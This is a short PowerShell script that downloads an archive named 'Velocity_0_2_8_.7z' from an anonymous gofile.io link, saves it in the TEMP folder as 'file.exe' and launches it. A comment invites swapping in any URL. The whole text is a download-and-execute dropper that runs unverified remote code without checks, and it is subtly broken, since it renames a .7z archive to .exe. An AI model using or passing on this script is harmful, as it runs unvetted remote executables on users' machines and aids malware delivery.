$FileUrl = "https://file-eu-par-2.gofile.io/download/web/9c468f47-0f7c-44cc-b292-5fb04d807fb3/Velocity_0_2_8_.7z"  # Replace with your file URL
$OutputPath = "$env:TEMP\file.exe"

Invoke-WebRequest -Uri $FileUrl -OutFile $OutputPath
Start-Process -FilePath $OutputPath -Wait
